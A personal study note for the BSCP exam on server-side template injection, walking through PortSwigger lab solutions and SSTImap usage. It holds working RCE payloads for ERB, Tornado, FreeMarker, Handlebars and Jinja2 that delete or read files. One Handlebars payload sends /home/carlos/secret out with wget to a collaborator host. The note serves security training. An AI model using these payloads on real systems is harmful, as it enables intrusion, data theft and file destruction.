## Stage 3
### What is it?
Native template syntax to inject a malicious payload into a template, which is then executed server-side. **Server-side template injection** attacks can occur when user input is concatenated directly into a template rather than passed as data.

Use this to help identify SSTI..?
![462](SSTI-20260114204747801.png)

### Useful Resources
- [SSTImap](https://github.com/vladko312/SSTImap) 
- This payload could produce an error to reveal the template framework: `fuzzer${{<%[%'"}}%\,<>`

### Exam
>Note: _**Identify**_ the Update forgot email template message under the admin_panel at the path /update_forgot_email.

### SSTImap
Need to activate the `sstimap_venv` python virtual environment to use this tool because the required dependencies were installed there.
```
# First install
cd /Users/shixian/Documents/Hax/bscp/
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python3 -m venv sstimap_venv
source sstimap_venv/bin/activate
pip install -r requirements.txt
python3 sstimap.py

# How to run
python3 sstimap.py -u "{URL_WITH_URL_PARAM}"

# Example of URL Param
python3 sstimap.py -u "https://0a720051037c923381c752f1004000d6.web-security-academy.net/?message=Unfortunately"

# Example of Body Param {DIDNT WORK NEED TO FIGURE THIS OUT MAYBE}
python3 sstimap.py -u "https://0a2e00f7036c0f718883d070001e0034.web-security-academy.net/my-account/change-blog-post-author-display" --data "blog-post-author-display=user.name&csrf=JaV2fNE2UMcYbVmmUrhRX0HKwqzC9sx2" --interactive
```

#### Trying SSTImap on a burp lab
##### URL Params
1. The `ok` messages means it's vulnerable to SSTI.
	1. ![SSTI-20260216153952709](SSTI-20260216153952709.png)
2. Using the `--interactive` command so we don't have to keep running separate commands
3. After SSTImap found `message` was vulnerable, use `shell` to get a shell and run commands like `ls` and it showed `morale.txt`.
	1. **For the exam, `cat /home/carlos/secret` for the flag**
	2. ![SSTI-20260216154752458](SSTI-20260216154752458.png)
##### Body Param
1. SSTImap did not find `blog-post-author-display` vulnerable. Maybe have to submit a comment first, then run sstimap?
	1. ![SSTI-20260216155454714](SSTI-20260216155454714.png)

#### Some useful sstimap commands
```
# Make sure the engine matches sstimap's results
python3 sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"

python3 sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
```

- `GET /?message=Unfortunately...`  after clicking on View details
	- `<%25%3d+7*7+%25>`
		- 49 in response
			- **SSTImap: OK** - [SSTI](SSTI.md#3.1.%20Lab%20Basic%20server-side%20template%20injection%20%E2%AD%95%EF%B8%8F)
		- `7*7` in response then `fuzzer${{<%[%'"}}%\,<>` show `handlebars`
			- [SSTI](SSTI.md#3.4.%20Lab%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit%20%E2%AD%95%EF%B8%8F%0A%60%60%60%0A%23%203.1.%20Lab%20Basic%20server-side%20template%20injection%0AGET%20%2F%3Fmessage%3D%3C%2525%253d%2Bsystem%28%22cat%2B%2Fhome%2Fcarlos%2Fmorale.txt%22%29%2B%2525%3E%0A%0A%23%20Alternatives%0A%23%20Lists%20out%20directories%0A%3C%2525%253d%2BDir.entries%28%27%2F%27%29%2B%2525%3E%0A%0A%23%20Uses%20file%20read%0A%3C%2525%253d%2BFile.read%28%27%2Fhome%2Fcarlos%2Fsecret%27%29%2B%2525%3E%0A%60%60%60%0A%0AChange%20preferred%20name%20feature%0A-%20%60%7D%7D%7B%7B7%2A7%7D%7D%60%20on%20%60blog-post-author-display%60%20param%20in%20%60POST%60%20request%0A%09-%20Tornado%0A%09%09-%20%5B%5BSSTI%233.2.%20Lab%20Basic%20server-side%20template%20injection%20%28code%20context%29%20%E2%AD%95%EF%B8%8F)

SSTImap didn't find this param vulnerable -- use manual method
```
python3 sstimap.py -u "https://TARGET.net/product/template?productId=1" --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'

# step 1
python3 sstimap.py -u "https://0a65009404487e7a81422ad2005400b6.web-security-academy.net/my-account/change-blog-post-author-display" --cookie 'session=UmDp0lbvPWAV9Lhss8D7WqhC8xN7AWzQ' --method POST --marker FUZZ --data 'blog-post-author-display=FUZZ&csrf=wSpz8FltuugRhkg5HMsv4VmDosWkYgTH' --interactive

# step 2
run
```

Manual method
```
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')
```


- Product > Edit template has this syntax: `${someExpression}`
	- **SSTImap: OK** [SSTI](SSTI.md#3.3.%20Lab%20Server-side%20template%20injection%20using%20documentation%20%E2%AD%95%EF%B8%8F)
	- `fuzzer${{<%[%'"}}%\,<>` or `{%25+debug+%25}` == Django
		- [SSTI](SSTI.md#3.5.%20Lab%20Server-side%20template%20injection%20with%20information%20disclosure%20via%20user-supplied%20objects%20%E2%AD%95%EF%B8%8F)
```
# 3.3 Lab: Server-side template injection using documentation
# step 1
python3 sstimap.py -u "https://0a96001f035b82b08138431900fc0091.web-security-academy.net/product/template?productId=2" --cookie 'session=qMqE57Rr9OfQvxBlrLSiFafN07gonR8J' --method POST --marker FUZZ --data 'csrf=APOgR6tRij36VqQikLwcs0kdkM9r3OFj&template=FUZZ&template-action=save' --interactive

# step 2
ls

# step 3 
cat /home/carlos/secret
```

### Admin panel Password Reset Email SSTI
> Jinja2

[![image](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)](https://user-images.githubusercontent.com/58632878/231809302-f33ab8c9-da30-4542-ad9f-7dbd9502c822.png)

```
newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
&csrf=csrf
```


---
#### 3.1. Lab: Basic server-side template injection ⭕️
This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
1. Click View details on a product and notice HTTP history with a `GET` request `/?message=Unfortunately...` which is also reflected in the response.
	1. ![SSTI-20260114205204476](SSTI-20260114205204476.png)
2. This identifies an **Embedded Ruby (ERB) template syntax**.
3. Enter this payload: `<%= 7*7 %>` and check `49` in the response. We do, so this app is vulnerable to SSTI. Need to URL encode key characters before sending.
	1. ![SSTI-20260114205436411](SSTI-20260114205436411.png)
4. To solve the lab, url encode key characters and send: `<%= system("rm /home/carlos/morale.txt") %>` 
	1. ![SSTI-20260114205613053](SSTI-20260114205613053.png)

#ExamTip For the BSCP exam, these payloads are useful
```
<%= Dir.entries('/') %>

<%= File.open('/example/arbitrary-file').read %>

<%= system("cat /home/carlos/secret") %>
```

>[!tip] How to Identify this Vulnerability?
>1. `GET` request with text that is also reflected in the response
>2. `<%= 7*7 %>` getting a `49` in the response

**Use in exam**
```
GET /?message=<%25%3d+system("cat+/home/carlos/secret")+%25>
```

---
#### 3.2. Lab: Basic server-side template injection (code context) ⭕️
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login > use the Preferred Name feature by selecting Nickname. 
2. Home > find a blog and post a comment and notice that the comment will show wiener's nickname: `H0td0g`. It would show `Peter Wiener` by default or by Name.
	1. ![184](SSTI-20260114210300929.png)
3. Send `POST /my-account/change-blog-post-author-display` to Repeater. If you enter `}}{{7*7}}` in the `blog-post-author-display` param you'll get in error revealing this app uses the Tornado Template framework. *Or will see the error when you submit another comment.*
	1. ![SSTI-20260114210955488](SSTI-20260114210955488.png)
	2. ![SSTI-20260114211005071](SSTI-20260114211005071.png)
4. If you send `blog-post-author-display=user.nickname}}{{7*7}}` and check your comment, you should see the `7*7` execute as `49`.
	1. ![SSTI-20260114211118276](SSTI-20260114211118276.png)
5. Use python for Tornado: 
```
{% import os %} {{os.system('rm /home/carlos/morale.txt')
```
6. `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')` Send, refresh the blog, solved.

#ExamTip Might have to use this payload for the BSCP exam:
```
{% import os %} {{os.system('cat /home/carlos/secret')
```
>[!tip] How to Identify this Vulnerability?
>1. Feature that changes an output like preferred name: nickname and blog post showing nickname
>2. `}}{{7*7}}` as the payload breaks the app revealing it using the Tornado template

---
#### 3.3. Lab: Server-side template injection using documentation ⭕️
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials:
`content-manager:C0nt3ntM4n4g3r`
1. Login > select a product > Edit template > notice in the textbox that it has the syntax `${someExpression}`.
	1. ![SSTI-20260115163841999](SSTI-20260115163841999.png)
2. Enter an expression that doesn't exist like `${foobar}` then click Save or Preview and notice the error message revealing the FreeMaker template framework.
	1. ![SSTI-20260115164104390](SSTI-20260115164104390.png)
3. Enter this payload > Preview and solve: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
	1. ![SSTI-20260115164234997](SSTI-20260115164234997.png)
>[!tip] How to Identify this Vulnerability?
>1. `${someExpression}` syntax 

**Try in exam. SSTimap worked**
```
# step 1
python3 sstimap.py -u "https://0a96001f035b82b08138431900fc0091.web-security-academy.net/product/template?productId=2" --cookie 'session=qMqE57Rr9OfQvxBlrLSiFafN07gonR8J' --method POST --marker FUZZ --data 'csrf=APOgR6tRij36VqQikLwcs0kdkM9r3OFj&template=FUZZ&template-action=save' --interactive

# step 2
ls

# step 3
cat morale.txt
```
![Pasted image 20260221110647](Pasted%20image%2020260221110647.png)

**If SSTImap didn't work, use this**
```
${"freemarker.template.utility.Execute"?new()("cat secret")}

${"freemarker.template.utility.Execute"?new()("cat /home/carlos/secret")}
```

---
#### 3.4. Lab: Server-side template injection in an unknown language with a documented exploit ⭕️
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
1. Click View details > notice a `GET` request with the value in the `message` param reflected in the response. Putting `<%= 7*7 %>` did not work because we don't see `49`.
	1. ![SSTI-20260115164836094](SSTI-20260115164836094.png)
2. Using the fuzzer payload: `fuzzer${{<%[%'"}}%\,<>` to get an error message and found out that it uses the handlebars template framework.
	1. ![SSTI-20260115164931046](SSTI-20260115164931046.png)
3. Paste the payload below to `message`, Send, and solve. For some reason, the decoded payload from PortSwigger didn't solve the lab (400 Bad Request) due to extra %20's in it. The payload below works. **Notice to keep `wrtz`**. 
```
wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

>[!tip] How to Identify this Vulnerability?
>1. `GET` request with text that is also reflected in the response
>2. `fuzzer${{<%[%'"}}%\,<>` to produce an error and get the template framework

**Use in exam**
#ExamTip Use this to grab the secret file to collaborator in the exam. **But do not encode `wrtz`. 
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('wget https://OASTIFY.COM --post-file=/home/carlos/secret');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

---
#### 3.5. Lab: Server-side template injection with information disclosure via user-supplied objects ⭕️
This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
To solve the lab, steal and submit the framework's secret key.
You can log in to your own account using the following credentials:
`content-manager:C0nt3ntM4n4g3r`
1. Login > select a product > Edit template > notice in the textbox that it has the syntax `{{someExpression}}`. Throw any of the fuzzing strings below and it will throw an error revealing the template framework: Django.
	1. ![SSTI-20260115170647240](SSTI-20260115170647240.png)
	2. ![SSTI-20260115170706960](SSTI-20260115170706960.png)
2. `{{settings.SECRET_KEY}}` will show the secret key, submit and solve.
	1. ![SSTI-20260115170840236](SSTI-20260115170840236.png)
```
${{<%[%'"}}%\,
{% debug %} 
{{settings.SECRET_KEY}}
fuzzer${{<%[%'"}}%\,<>
```
>[!tip] How to Identify this Vulnerability?
>1. `{{someExpression}}` syntax 

---
